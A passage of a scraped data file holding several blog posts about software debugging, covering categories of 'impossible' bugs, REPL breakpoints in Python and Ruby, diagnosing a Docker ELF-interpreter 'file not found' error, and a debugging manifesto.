happy. \n\n (since I can now often actually fix bugs I tackle, perhaps this confidence is now reasonable :D) \n\n Know more things \n\n This  TCP bug  I talked about yesterday? I wouldn’t have been able to fix that in my first job out of grad school. I just didn’t understand enough about how computer networks work, or computers (I had an awesome math & theoretical CS degree and I did not learn anything about computers there.). And I didn’t know strace. \n\n There’s a service at work that sometimes takes a long time to respond because of JVM garbage collection pauses. If you don’t know that a common source of latency issues on the JVM is garbage collection pauses (or worse, if you don’t know that garbage collection pauses are even a thing that happen), then you’re going to have a really bad day trying to figure that out. \n\n Understanding the structure of the system I’m trying to debug and what some of the common failure modes are has been really indispensable to me. \n\n Talk to other people \n\n I sometimes just ramble into the Slack channel at work about the problem I’m working on, which sometimes looks like \n\n julia: i have no idea why this bug is happening\njulia: i mean I tried X and it is still happening\njulia: and also W\njulia: and also Z\njulia: OH RIGHT I FORGOT ABOUT ABC\njulia: yayy\nsomeone else: :)\n \n\n Also sometimes if I start talking about it then someone will come and talk to me and say something helpful! It’s the best. \n\n I got really stuck on that 3 week bug we talked about before and got on the phone to  Avi , which was VERY USEFUL because he wrote the code that I was optimizing. So in that case I didn’t just need a rubber duck, I needed to talk to someone who knew more about the code (“oh yeah we haven’t optimized that part at all yet so it’s not a surprise that it’s slow!”). \n\n I’ve gotten way better at figuring out what I don’t understand, articulating it, and asking about it. \n\n Use strace \n\n Seriously I could not fix bugs without strace. \n\n More generally, being able to observe directly what a program is actually doing is incredibly valuable. I was trying to debug recently why a request I was sending to Redis was invalid. And I read the code, and asked other people, and they were like “huh that looks right”. AND THEN I REMEMBERED ABOUT TCPDUMP. (tcpdump shows you the TCP traffic coming in and out of a machine. it’s the best.) \n\n So I ran tcpdump on a machine that I knew was sending (valid) requests to Redis, just looked at it as ASCII in my terminal, and then all the information was right there! And I copied the valid thing into what I was testing, and it totally worked and explained everything. \n\n I like it more \n\n I used to not really like debugging. But I started being able to solve harder bugs, and now when I find a thorny debugging problem it’s way more exciting to me than writing new code. Most of the code I write is really straightforward. A difficult bug is way more likely to teach me something I didn’t know before about how computers can break. \n\n ❤ debugging ❤ \n\n"},
{"url": "https://jvns.ca/blog/2021/06/08/reasons-why-bugs-might-feel-impossible/", "title": "Reasons why bugs might feel \"impossible\"", "content": "\n     \n\n Hello! I’m  very slowly \nworking on writing a zine about debugging, so I  asked on Twitter the other day : \n\n \n If you’ve run into a bug where it felt “impossible” to understand what was happening – what made it feel that way? \n \n\n Of course, bugs always happen for logical reasons, but I’ve definitely run into\nbugs that felt like they might be impossible for me to understand (until I\nfigured them out!) \n\n I got about 400 responses, which I’ll try to summarize here. I’m not going to\ntalk about how to deal with these various kinds of “impossible” bugs in this\npost, I’ll just try to classify them. \n\n Here are the categories I came up with for ways a bug might feel impossible\nto understand. Each one of them has a bunch of sub variants which are bolded below. \n\n \n it’s hard to reproduce \n you don’t understand the overall system well \n it’s hard to get data about the bug \n one of your assumptions is wrong \n the bug is really complex \n \n\n 1. the bug is hard to reproduce locally \n\n I thought  this description  was really great: \n\n \n The ones that make me contemplate a career change are usually bugs that are\nonly happen to a few users, can’t be reproduced consistently by users or at all\nin-house, and have slightly varying descriptions in each bug report (kinda like\nBigfoot sightings). \n \n\n Here are some specific ways a bug can be hard to reproduce: \n\n the bug is nondeterministic \n\n You run your program with the exact same inputs 1000 times, and it only fails\nonce. This happens a lot with race conditions in multithreaded programs. \n\n the bug only happens in production \n\n Lots of bugs are hard to reproduce in your dev environment, either because it’s\nhard to figure out exactly which inputs trigger the bug, or because they only\nhappen under certain conditions (like a lot of traffic) which are hard to\nrecreate. \n\n you don’t have access to the machine where the bug is happening \n\n Three examples of this: \n\n \n you’re shipping software (a binary or a website) that runs on your customer’s\ncomputer, they have a problem, and you don’t have direct access to their\ncomputer to see what’s going on. \n the problem involves a managed cloud service that you don’t have a lot of\naccess to. \n the problem only happens on an input of data that you don’t have access to (perhaps because the data is classified/private) \n \n\n you don’t have access to the data you need to reproduce the bug \n\n One person mentioned a case where the bug was easy to reproduce, but the data\nthey needed to reproduce it was confidential, so they weren’t allowed to have\naccess to it. \n\n it’s very slow to reproduce \n\n There are bugs where you know exactly  how  to reproduce it, but it takes a long\ntime (like 20 minutes or way longer) to reproduce the bug. This is hard because\nit’s hard to maintain your focus: maybe you can only try 1 experiment per day! \n\n 2. you don’t understand the overall system well \n\n Even if you can reproduce the bug, if you don’t understand how the part of\nthe program with the bug works, you can end up VERY stuck. \n\n Some examples of this that came up: \n\n unknown unknowns: the bug involves a system or concept you’ve didn’t know about \n\n Sometimes bugs are caused by a part of the system that you didn’t even know\nexisted. For example, when I was debugging  this TCP issue ,\nI’d never heard of Nagle’s algorithm or delayed ACKs. So it was pretty\ndifficult to recognize that they were causing the problem! \n\n The only reason I was able to diagnose that bug was that someone at work had\ncoincidentally posted a blog post about it and I remembered the symptoms were\nsimilar. \n\n Here’s another example of this from the Twitter replies: \n\n \n I was sending strings containing null bytes (long story) between two systems\nthat support them, but in some cases, theres a step along the way that doesn’t\nsupport them \n \n\n Another example of “the bug is in a surprising place” is  this case of a bug in a scanner . \n\n The next few sections are more specific ways confusion about the program works\ncan make a bug difficult to solve. \n\n the bug is in an external library you don’t understand \n\n Sometimes the bug is in a library or an open source program you’re\ncompletely unfamiliar with, but you have to fix it anyway. This makes debugging hrad because: \n\n \n you need to learn how the library works \n it’s not always easy to modify the library and get your program to use your\nmodified version of the library, so it’s hard to experiment and make changes\nor add extra instrumentation to the library \n \n\n you don’t understand the error message at all \n\n Some error messages initially seem totally incomprehensible. A couple of examples of this: \n\n \n “values of β may give rise to dom!”, from  this talk by Mark Allen on that error message  or \n “Size must be between and 16793600(16MB) First element: oints” from the talk  The tales of the cursed operating systems textbook  by Kiran Bhattaram \n Some compiler error messages can be very confusing if you don’t know what they mean \n \n\n These are tricky because it’s not clear where to start – what is β? What is this element oints doing here? \n\n Another variant of this is debugging output that’s formatted in a confusing way. \n\n you don’t know what keywords to search to get more information \n\n One case that a lot of people mentioned is: you search for a keyword that you\nthink is related to your bug, you get 10 million results, and none of them are helpful. \n\n the bug is in a proprietary system \n\n Figuring out an unfamiliar system is already hard, and it’s even worse when you\ncan’t even read the source code! \n\n the system is poorly documented \n\n A few variants of this: \n\n \n there’s no documentation, or very sparse documentation \n the only information about the system is from someone you can’t contact –\nperson who  does  understand it has left the company, or you don’t know who\nthey are, or they work at a company you can’t find any contact information\nfor \n the information you need is in a 2000 page PDF and you don’t know where to\nstart looking \n \n\n 3. it’s hard to get information about the program’s internal state \n\n Even if you generally understand the system you’re working with and you can\nreproduce the bug, debugging is almost impossible if you can’t get enough\ninformation about the program’s internal state when the bug happens. \n\n Here are a few specific reasons it can be hard to get data about the program’s\ninternal state. \n\n there’s no output at all \n\n Your program failed, but there’s no output at all to read to tell you why it\nfailed. Not even an error message! It just didn’t work. \n\n This has happened to me before with operating systems bugs – my toy OS didn’t\nstart and because it failed before I had any way of printing output, I had no\nidea was wrong – it just didn’t work! \n\n there’s way too much output \n\n It’s also easy to drown in  too much  output – I’ve turned on debug output and\nthen been totally overwhelmed by how much information there is. It’s very hard\nto tell what’s relevant and what’s irrelevant in a million log lines! \n\n information about the bug is split across many places \n\n When investigating a distributed systems bug, the log lines related to the bug\nare often spread across a bunch of different services. And sometimes there’s no\nrequest ID that you can use to easily figure out which log lines from service A\ncorresponded to the exception you saw in service B. \n\n So you end up spending a long time manually staring at logs and trying to\ncorrelate them. I’ve spent more of my life doing this than I’d prefer :) \n\n it’s not possible to use a debugger/add print statements \n\n For example, if you want to know something about the state of your database\n(like Postgres), you’re definitely not going to attach a debugger to your\nproduction database, and you probably don’t want to recompile it to add extra\nlogging information. (though I have definitely recompiled programs just to add\nextra logging information I needed!) \n\n So you need to rely on the program’s existing logging mechanisms and hope that\nthey have the information you need. \n\n the bug goes away when you use a debugger \n\n Here’s a story from the Twitter replies about that: \n\n \n I had a bug in C++ code that would cause a seg fault. When I compiled with\nthe debug flag on, it worked fine. So really hard to find. Turned out I was\ncopying a string that was 2 bytes too big into a struct. The debug flag created\nextra space for it! \n \n\n Another reason a debugger can cause a bug to go away is if it’s a race\ncondition – debuggers often make the program run a little bit slower which can\ncause the race not to happen. \n\n A related story about how a print statement can make the bug disappear: \n\n \n In c or c++ printf can act as an ad-hoc synchronization point/cooperative MT\npoint so adding printf changes the execution order of the threads, making them\nproblem go away. \n \n\n 4. one of your assumptions is wrong \n\n For example, in almost all cases it’s fair to assume that the compiler does not\nhave a bug and that the bug is in your code. But as someone on Twitter pointed\nout, very rarely it is a compiler bug! ( here’s the compiler bug they\nexperienced ) \n\n Other examples of (more mundane) assumptions that can be wrong: \n\n \n assuming your new code is being run when in fact something is being cached \n assuming some environment variable is set when it isn’t \n assuming the bug is in the software when it’s in the hardware (like a bad cable!) \n assuming the documentation is correct \n \n\n Let’s go over a few variants of “one of your assumptions is wrong”. \n\n the red herring \n\n Sometimes you see something early on when debugging that looks VERY suspicious\nand spend a long time investigating it, but then it turns out to be totally\nunrelated to the bug. This is pretty normal and it often doesn’t mean you did\nanything wrong (you can’t take the perfect most efficient path to understanding\nthe bug every time!). But it can be really demoralizing. \n\n the case that works and the case that doesn’t work look EXACTLY the same \n\n This one is SO frustrating when it happens – you’re 100% sure nothing changed\nbut somehow the code is no longer working! (of course, the answer is that something did change, you just can’t see it) \n\n A few examples of this. \n\n \n one input causes your code to break, but it succeeds on a bunch of other\ninputs and you can’t figure out what’s different about the input that makes\nthe code break \n there’s a typo that your brain is just refusing to notice \n a very small code change has caused a bug and you really think it shouldn’t\nhave made any difference \n the exact same code is running on the same inputs, but there’s some external\nfactor causing the bug that you haven’t considered (like a file on disk or\nan environment variable) \n \n\n The last type we’ll talk about is bugs that are just really complex! \n\n 5. the bug is really complicated \n\n I wanted to separate this one out because a lot of bugs that are VERY DIFFICULT\nto understand are actually pretty simple in the end! They’re just difficult to\nunderstand because of some of the above reasons (incorrect assumptions! you\ndon’t understand the system! it’s hard to observe the program’s state!). \n\n But some bugs are genuinely very complicated. A few variants of this one: \n\n the code is complicated \n\n One  example from twitter : \n\n \n too many, far-flung, and unknown influences on system behavior. e.g. multiple\ninheritance run amok  across  libraries \n \n\n the error message has 0 results when you Google it \n\n This doesn’t always mean the bug is complicated, but it’s alarming when there\nare 0 results, or there’s 1 result and it’s… the library’s source code, or 1\nsad person on a forum posting about your exact bug but there are no replies.\n(“Oh no, has NOBODY ever run into this bug before?!?!”) \n\n the bug is actually 3 bugs \n\n With most bugs, only one thing is going wrong – everything in the system is\nworking correctly except 1 thing and you just need to identify the 1 thing\nthat’s causing the problem. \n\n It’s a lot harder when multiple things are broken at once – maybe there’s\na bug in your program, and also a bug in a library you’re using, and also some\nunexpected behaviour on the part of your load balancer. \n\n One common example of this is security vulnerabilities – they often involve\npretty complex bugs that take a long time to explain and understand even when\nyou figure out exactly what’s going on. \n\n bonus: you’re tired \n\n This isn’t really a technical reason, but tricky bugs are WAY harder to fix\nwhen you’re tired or stressed out after a long day. \n\n it’s fun to see that many people have the same types of impossible bugs \n\n I really enjoyed seeing how many people talked about the same reasons for\n“impossible” bugs. Debugging sometimes feels like a really intense personal\nstruggle (WHY is this happening to ME?!?!) and I thought it was really cool to\nsee that even some of the weirdest reasons for bugs are shared by a lot of\npeople! More than one person mentioned “the debugger stops the bug from\nhappening”! \n\n many of these can happen all at once \n\n I was chatting with my partner about a performance problem at work that took\nthem months to diagnose. It was challenging because: \n\n \n it was intermittent (only happened when there was a lot of traffic) \n it only happened in production \n they didn’t have direct access to the system where it was happening (it was managed by a vendor) \n it involved a Linux kernel system that they didn’t previously know existed \n \n\n They figured it out, but because there were so many things that made it difficult, it took a lot of time! \n\n \nIf you’re interested in hearing about this debugging zine if/when I ever finish\nit, you can subscribe to my  zine announcements  mailing list. And\nof course I’ll post about it on this blog.\n \n\n"},
{"url": "https://jvns.ca/blog/2021/09/16/debugging-in-a-repl-is-fun/", "title": "Debugging by starting a REPL at a breakpoint is fun", "content": "\n     \n\n Hello! I was talking to a Python programmer friend yesterday about debugging,\nand I mentioned that I really like debugging using a REPL. He said he’d never\ntried it and that it sounded fun, so I thought I’d write a quick post about it. \n\n This debugging method doesn’t work in a lot of languages, but it does work in\nPython and Ruby and kiiiiiind of in C (via gdb). \n\n what’s a REPL? \n\n REPL stands for “read eval print loop”. A REPL is a program that: \n\n \n reads some input from you like  print(f\"2 + 2 = {2+2}\")  ( read ) \n evaluates the input ( eval ) \n print out the result ( print ) \n and then goes back to step 1 ( loop ) \n \n\n Here’s an example of me using the IPython REPL to run a print statement. (also\nit demonstrates f-strings, my favourite Python 3 feature) \n\n $ ipython3\nPython 3.9.5 (default, May 24 2021, 12:50:35) \nType 'copyright', 'credits' or 'license' for more information\nIPython 7.24.1 -- An enhanced Interactive Python. Type '?' for help.\n\nIn [1]: print(f\"2 + 2 = {2+2}\")\n2 + 2 = 4\n\nIn [2]: \n \n\n you can start a REPL at a breakpoint \n\n There are 2 ways to use a REPL when debugging. \n\n Way 1 : Open an empty REPL (like IPython, pry, or a browser Javascript console) to test out something. \n\n This is great but it’s not what I’m talking about in this post. \n\n Way 2 : Set a breakpoint in your program, and start a REPL at that\nbreakpoint. \n\n This is the one we’re going to be talking about. I like doing this because it gives me both: \n\n \n all the variables in scope at the breakpoint, so I can print them out interactively \n easy access to all the functions in my program, so I can call them to try to find issues \n \n\n how to get a REPL in Python:  ipdb.set_trace() \n\n Here’s a program called  test.py  that sets a breakpoint on line 5 using\n import ipdb; ipdb.set_trace() . \n\n import requests\n\ndef make_request():\n    result = requests.get(\"https://google.com\")\n    import ipdb; ipdb.set_trace()\n\nmake_request()\n \n\n And here’s what it looks like when you run it: you get a REPL where you can\ninspect the  result  variable or do anything else you want. \n\n python3 test.py\n--Return--\nNone\n> /home/bork/work/homepage/test.py(5)make_request()\n      4     result = requests.get(\"https://google.com\")\n----> 5     import ipdb; ipdb.set_trace()\n      6 \n\nipdb> result.headers\n{'Date': 'Thu, 16 Sep 2021 13:11:19 GMT', 'Expires': '-1', 'Cache-Control': 'private, max-age=0', 'Content-Type': 'text/html; charset=ISO-8859-1', 'P3P': 'CP=\"This is not a P3P policy! See g.co/p3phelp for more info.\"', 'Content-Encoding': 'gzip', 'Server': 'gws', 'X-XSS-Protection': '0', 'X-Frame-Options': 'SAMEORIGIN', 'Set-Cookie': '1P_JAR=2021-09-16-13; expires=Sat, 16-Oct-2021 13:11:19 GMT; path=/; domain=.google.com; Secure, NID=223=FXhKNT7mgxX7Fjhh6Z6uej9z13xYKdm9ZuAU540WDoIwYMj9AZzWTgjsVX-KJF6GErxfMijl-uudmjrJH1wgH3c1JjudPcmDMJovNuuAiJqukh1dAao_vUiqL8ge8pSIXRx89vAyYy3BDRrpJHbEF33Hbgt2ce4_yCZPtDyokMk; expires=Fri, 18-Mar-2022 13:11:19 GMT; path=/; domain=.google.com; HttpOnly', 'Alt-Svc': 'h3=\":443\"; ma=2592000,h3-29=\":443\"; ma=2592000,h3-T051=\":443\"; ma=2592000,h3-Q050=\":443\"; ma=2592000,h3-Q046=\":443\"; ma=2592000,h3-Q043=\":443\"; ma=2592000,quic=\":443\"; ma=2592000; v=\"46,43\"', 'Transfer-Encoding': 'chunked'}\n \n\n You have to install  ipdb  to make this work, but I think it’s worth it –\n import pdb; pdb.set_trace()  will work too (and is built into Python) but\n ipdb  is much nicer. I just learned that you can also use  breakpoint()  in\nPython 3 to get a breakpoint, but that puts you in  pdb  too which I don’t\nlike. \n\n how to get a REPL in Ruby:  binding.pry \n\n Here’s the same thing in Ruby – I wrote a  test.rb  program: \n\n require 'net/http'\nrequire 'pry'\n\ndef make_request()\n  result = Net::HTTP.get_response('example.com', '/')\n  binding.pry\nend\n\nmake_request()\n \n\n and here’s what it looks like when I run it: \n\n $ ruby test.rb\nFrom: /home/bork/work/homepage/test.rb:6 Object#make_request:\n\n    4: def make_request()\n    5:   result = Net::HTTP.get_response('example.com', '/')\n => 6:   binding.pry\n    7: end\n\n[1] pry(main)> result.code\n=> \"200\"\n \n\n you can also do get a REPL in the middle of an HTTP request \n\n Rails also lets you start a REPL in the middle of a HTTP request and poke\naround and see what’s happening. I assume you can do this in Flask and Django\ntoo – I’ve only really done this in Sinatra (in Ruby). \n\n GDB is sort of like a REPL for C \n\n I was talking to another friend about REPLs, and we agreed that GDB is a little\nbit like a REPL for C. \n\n Now, obviously this is sort of not true – C is a compiled language, and you\ncan’t just type in arbitrary C expressions in GDB and have them work. \n\n But you can do a surprising number of things like: \n\n \n call functions \n inspect structs if your program has debugging symbols ( p var->field->subfield ) \n \n\n This stuff only works in gdb because the gdb developers put in a lot of work\ndoing Very Weird Things to make it easier to get a REPL-like experience. I\nwrote a blog post a few years called\n how does gdb call functions?  about\nhow surprising it is that gdb can call functions, and how it does that. \n\n This is the only way I use  gdb  when looking at C programs – I never set\nwatchpoints or do anything fancy, I just set a couple of breakpoints in the\nprogram and then poke around at those points. \n\n where this method works \n\n languages where this works: \n\n \n Python \n Ruby \n probably PHP, but I don’t know \n C, sort of, in a weird way (though you might disagree :)) \n in Javascript: it seems like you can use  debugger;  to get a REPL through\neither  node inspect  or the browser console. There seem to be some\nlimitations on what you can do (like node won’t let me use  await  in its\nREPL), but I haven’t done enough JS to fully understand this. \n In Java, apparently IntelliJ lets you  evaluate arbitrary expressions at a breakpoint , which isn’t quite a REPL but is cool \n \n\n languages where this doesn’t work: \n\n \n most compiled languages \n \n\n REPL debugging is easy for me to remember how to do \n\n There are (at least) 4 different ways of debugging: \n\n \n Lots of print statements \n a debugger \n getting a REPL at a breakpoint \n inspect your program with external tools like strace \n \n\n I think part of the reason I like this type of REPL debugging more than using a\nmore traditional debugger is – it’s so easy to remember how to do it! I can\njust set a breakpoint, and then run code to try to figure out what’s wrong. \n\n With debuggers, I always forget how to use the debugger (probably partly\nbecause I switch programming languages a lot) and I get confused about what\nfeatures it has and how they work, so I never use it. \n\n"},
{"url": "https://jvns.ca/blog/2021/11/17/debugging-a-weird--file-not-found--error/", "title": "Debugging a weird 'file not found' error", "content": "\n     \n\n Yesterday I ran into a weird error where I ran a program and got the error\n“file not found” even though the program I was running existed. It’s something\nI’ve run into before, but every time I’m very surprised and confused by it\n(what do you MEAN file not found, the file is RIGHT THERE???!!??) \n\n So let’s talk about what happened and why! \n\n the error \n\n Let’s start by showing the error message I got. I had a Go program called\n serve.go , and I was trying to bundle it into a Docker container with this\nDockerfile: \n\n FROM golang:1.17 AS go\n\nADD ./serve.go /app/serve.go\nWORKDIR /app\nRUN go build serve.go\n\nFROM alpine:3.14\n\nCOPY --from=go /app/serve /app/serve\nCOPY ./static /app/static\nWORKDIR /app/static\nCMD [\"/app/serve\"]\n \n\n This Dockerfile \n\n \n Builds the Go program \n Copies the binary into an Alpine container \n \n\n Pretty simple. Seems like it should work, right? \n\n But when I try to run  /app/serve , this happens: \n\n $ docker build .\n$ docker run -it broken-container:latest /app/serve\nstandard_init_linux.go:228: exec user process caused: no such file or directory\n \n\n But the file definitely does exist: \n\n $ docker run -it broken-container:latest ls -l /app/serve\n-rwxr-xr-x    1 root     root       6220237 Nov 16 13:27 /app/serve\n \n\n So what’s going on? \n\n idea 1: permissions \n\n At first I thought “hmm, maybe the permissions are wrong?”. But this can’t be the problem, because: \n\n \n permission problems don’t result in a “no such file or directory” error \n in any case when we ran  ls -l , we saw that the file was executable \n \n\n (I’m including this even though it’s “obviously” wrong just because I have\na lot of wrong thoughts when debugging, it’s part of the process :) ) \n\n idea 2: strace \n\n Then I decided to use strace, as always. Let’s see what stracing  /app/serve/  looks like \n\n $ docker run -it broken-container:latest /bin/sh\n$ /app/static # apk add strace\n(apk output omitted)\n$ /app/static # strace /app/serve\nexecve(\"/app/serve\", [\"/app/serve\"], 0x7ffdd08edd50 /* 6 vars */) = -1 ENOENT (No such file or directory)\nstrace: exec: No such file or directory\n+++ exited with 1 +++\n \n\n This is not that helpful, it just says “No such file or directory” again. But\nat least we know that the error is being thrown right away when we run the\n evecve  system call, so that’s good. \n\n Interestingly though, this is different from what happens when we try to strace a nonexistent binary: \n\n $ strace /app/asdf\nstrace: Can't stat '/app/asdf': No such file or directory\n \n\n idea 3: google “enoent but file exists execve” \n\n I vaguely remembered that there was some reason you could get an  ENOENT  error\nwhen executing a program even if the file did exist, so I googled it. This led me\nto  this stack overflow answer \n\n which said, very helpfully: \n\n \n When execve() returns the error ENOENT, it can mean more than one thing:  \n  1. the program doesn’t exist;  \n 2. the program itself exists, but it requires an “interpreter” that doesn’t exist.\n \nELF executables can request to be loaded by another program, in a way very similar to  #!/bin/something  in shell scripts. \n \n\n That answer says that we can find the interpreter with  readelf -l $PROGRAM | grep interpreter . So let’s do that! \n\n step 4: use  readelf \n\n I didn’t have  readelf  installed in the container and I wasn’t sure how to\ninstall it, so I ran  mount  to get the path to the container’s filesystem and\nthen ran  readelf  from the host using that overlay directory. \n\n (as an aside: this is kind of a weird way to do this, but as a result of writing\na  containers zine  I’m used to doing\nweird things with containers and I think doing weird things is fun, so this way just seemed fastest to me at the time.  That trick\nwon’t work if you’re on a Mac though, it only works on Linux) \n\n $ mount | grep docker\noverlay on /var/lib/docker/overlay2/1ed587b302af7d3182135d02257f261fd491b7acf4648736d4c72f8382ecba0d/merged type overlay (rw,relatime,lowerdir=/var/lib/docker/overlay2/l/326ILTM2UXMVY64V7JFPCSDSKG:/var/lib/docker/overlay2/l/MGGPR357UOZZWXH3SH2AYHJL3E:/var/lib/docker/overlay2/l/EEEKSBSQ6VHGJ77YF224TBVMNV:/var/lib/docker/overlay2/l/RVKU36SQ3PXEQAGBRKSQRZFDGY,upperdir=/var/lib/docker/overlay2/1ed587b302af7d3182135d02257f261fd491b7acf4648736d4c72f8382ecba0d/diff,workdir=/var/lib/docker/overlay2/1ed587b302af7d3182135d02257f261fd491b7acf4648736d4c72f8382ecba0d/work,index=off)\n$ # (then I copy and paste the \"merged\" directory from the output)\n$ readelf -l /var/lib/docker/overlay2/1ed587b302af7d3182135d02257f261fd491b7acf4648736d4c72f8382ecba0d/merged/app/serve | grep interp \n      [Requesting program interpreter: /lib64/ld-linux-x86-64.so.2]\n   01     .interp \n   03     .text .plt .interp .note.go.buildid \n \n\n Okay, so the interpreter is  /lib64/ld-linux-x86-64.so.2 . \n\n And sure enough, that file doesn’t exist inside our Alpine container \n\n $ docker run -it broken-container:latest ls /lib64/ld-linux-x86-64.so.2\n \n\n step 5: victory! \n\n Then I googled a little more and found out that there’s a  golang:alpine \ncontainer that’s meant for doing Go builds targeted to be run in Alpine. \n\n I switched to doing my build in the  golang:alpine  container and that fixed\neverything. \n\n question: why is my Go binary dynamically linked? \n\n The problem was with the program’s interpreter. But I remembered that only\ndynamically linked programs have interpreters, which is a bit weird – I\nexpected my Go binary to be statically linked! What’s going on with that? \n\n First, I double checked that the Go binary was actually dynamically linked using  file  and  ldd : ( ldd  lists the dependencies of a dynamically linked executable! It’s very useful!) \n\n (I’m using the docker overlay filesystem to get at the binary inside the container again) \n\n $ file /var/lib/docker/overlay2/1ed587b302af7d3182135d02257f261fd491b7acf4648736d4c72f8382ecba0d/merged/app/serve \n/var/lib/docker/overlay2/1ed587b302af7d3182135d02257f261fd491b7acf4648736d4c72f8382ecba0d/merged/app/serve:\nELF 64-bit LSB executable, x86-64, version 1 (SYSV), dynamically linked,\ninterpreter /lib64/ld-linux-x86-64.so.2, Go\nBuildID=vd_DJvcyItRi4Q2RD0WL/z8P4ulttr6F6njfqx8CI/_odQWaUTR2e38bdHlD0-/ikjsOjlMbEOhj2qXv5AE,\nnot stripped\n$ ldd /var/lib/docker/overlay2/1ed587b302af7d3182135d02257f261fd491b7acf4648736d4c72f8382ecba0d/merged/app/serve\n\tlinux-vdso.so.1 (0x00007ffe095a6000)\n\tlibpthread.so.0 => /usr/lib/libpthread.so.0 (0x00007f565a265000)\n\tlibc.so.6 => /usr/lib/libc.so.6 (0x00007f565a099000)\n\t/lib64/ld-linux-x86-64.so.2 => /usr/lib64/ld-linux-x86-64.so.2 (0x00007f565a2b4000)\n \n\n Now that I know it’s dynamically linked, it’s not that surprising that it\ndidn’t work on a different system than it was compiled on. \n\n Some Googling tells me that I can get Go to produce a statically linked binary by setting  CGO_ENABLED=0 . Let’s see if that works. \n\n $ # first let's build it without that flag\n$ go build serve.go\n$ file ./serve\n./serve: ELF 64-bit LSB executable, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, Go BuildID=UGBmnMfFsuwMky4-k2Mt/RaNGsMI79eYC4-dcIiP4/J7v5rNGo3sNiJqdgNR12/eR_7mqqrsil_Lr6vt-rP, not stripped\n$ ldd ./serve\n\tlinux-vdso.so.1 (0x00007fff679a6000)\n\tlibpthread.so.0 => /usr/lib/libpthread.so.0 (0x00007f659cb61000)\n\tlibc.so.6 => /usr/lib/libc.so.6 (0x00007f659c995000)\n\t/lib64/ld-linux-x86-64.so.2 => /usr/lib64/ld-linux-x86-64.so.2 (0x00007f659cbb0000)\n$ # and now with the CGO_ENABLED_0 flag\n$ env CGO_ENABLED=0 go build serve.go\n$ file  ./serve\n./serve: ELF 64-bit LSB executable, x86-64, version 1 (SYSV), statically linked, Go BuildID=Kq392IB01ShfNVP5TugF/2q5hN74m5eLgfuzTZzR-/EatgRjlx5YYbpcroiE9q/0Fg3zUxJKY3lbsZ9Ufda, not stripped\n$ ldd  ./serve\n\tnot a dynamic executable\n \n\n It works! I checked, and  that’s an alternative way to fix this bug – if I just set the\n CGO_ENABLED=0  environment variable in my build container, then I can build a\nstatic binary and I don’t need to switch to the  golang:alpine  container for my builds. I\nkind of like that fix better. \n\n And statically linking in this case doesn’t even produce a bigger binary (for\nsome reason it seems to produce a slightly  smaller  binary?? I don’t know why\nthat is) \n\n I still don’t understand  why  it’s using cgo here, I ran  env | grep CGO  and I\ndefinitely don’t have  CGO_ENABLED=1  set in my environment, but I\ndon’t feel like solving that mystery right now. \n\n that was a fun bug! \n\n I thought this bug was a nice way to see how you can run into problems when\ncompiling a dynamically linked executable on one platform and running it on\nanother one! And to learn about the fact that ELF files have an interpreter! \n\n I’ve run into this “file not found” error a couple of times, and it feels kind\nof mind bending because it initially seems impossible (BUT THE FILE IS THERE!!!\nI SEE IT!!!). I hope this helps someone be less confused if you run into it! \n\n"},
{"url": "https://jvns.ca/blog/2022/12/08/a-debugging-manifesto/", "title": "A debugging manifesto", "content": "\n     \n\n Hello! I’ve been working on a zine about debugging for the last 6 months with\nmy friend  Marie , and one of the problems we ran\ninto was figuring out how to explain the right  attitude  to take when debugging. \n\n We ended up writing a short debugging manifesto to start the zine with, and I’m\npretty happy with how it came out. Here it is as an image, and as text (with\nsome extra explanations) \n\n \n\n 1. Inspect, don’t squash \n\n When you run into a bug, the natural instinct is to try to  fix it  as fast as\npossible. And of course, sometimes that’s what you have to do – if the bug is\ncausing a huge production incident, you have to mitigate it quickly before\ndiving into figuring out the root cause. \n\n But in my day to day debugging, I find that it’s generally more effective (and\nfaster!) to  leave the bug in place , figure out exactly what’s gone wrong,\nand then fix it after I’ve understood what happened. \n\n Trying to fix it or add workarounds without fully understanding what happened\nusually ends up just leaving me  more  confused. \n\n 2. Being stuck is temporary \n\n Sometimes I get really demoralized when debugging and it feels like I’ll NEVER\nmake progress. \n\n I have to remind myself that I’ve fixed a lot of bugs before, and I’ll probably\nfix this one too :) \n\n 3. Trust nobody and nothing \n\n Sometimes bugs come from surprising sources! For example, in  I think I found a Mac kernel bug?  I describe how,\nthe first time I tried to write a program for Mac OS, I had a bug in my program\nthat was caused by a Mac OS kernel bug. \n\n This was really surprising (usually the operating system is not at fault!!),\nbut sometimes even normally-trustworthy sources are wrong. Even it’s a popular\nlibrary, your operating system, the official documentation, or an extremely\nsmart and competent coworker! \n\n 4. It’s probably your code \n\n That said,  almost all of the time  the problem is not “there’s a bug in Mac\nOS”. I can only speak for myself, but 95% of the time something is going wrong\nwith my program, it’s because I did something silly. \n\n So it’s important to look for the problem in your own code first before trying\nto blame some external source. \n\n 5. Don’t go it alone \n\n I’ve learned SO much by asking coworkers or friends for help with debugging. I\nthink it’s one of the most fun ways to collaborate because you have a specific\ngoal, and there are tons of opportunities to share information like: \n\n \n how to use a specific debugging tool (“here’s how to use GDB to inspect the memory here….”) \n how a computer thing works (“hey, can you explain CORS?”) \n similar past bugs (“I’ve seen this break in X way in the past, maybe it’s that?”) \n \n\n 6. There’s always a reason \n\n This one kind of speaks for itself: sometimes it  feels  like things are just\nrandomly breaking for no reason, but that’s never true. \n\n Even if something truly weird is happening (like a hardware problem), that’s\nstill a reason. \n\n 7. Build your toolkit \n\n I’ve written a LOT about my love for debugging tools like tcpdump, strace, and\nmore on this blog. \n\n To fix bugs you need information about what your program is doing, and to get\nthat information sometimes you need to learn a new tool. \n\n Also, sometimes you need to build your own better tools, like by improving your\ntest suite, pretty printing, etc. \n\n 8. It can be an adventure \n\n As you probably know if you’re a regular reader of this blog, I love debugging\nand I’ve learned a lot from doing it. You get to learn something new! Sometimes\nyou get a great war story to tell! What could be more fun? \n\n I really think of debugging as an investment in my future knowledge – if\nsomething is breaking, it’s often because there’s something wrong in my mental\nmodel, and that’s an opportunity to learn and make sure that I know it for next\ntime. \n\n Of course, not  all  bugs are adventures (that off-by-one error I was debugging\ntoday certainly did not feel like a fun adventure). But I think it’s important\nto (as much as you can) reflect on your bugs and see what you can learn from\nthem. \n\n"},
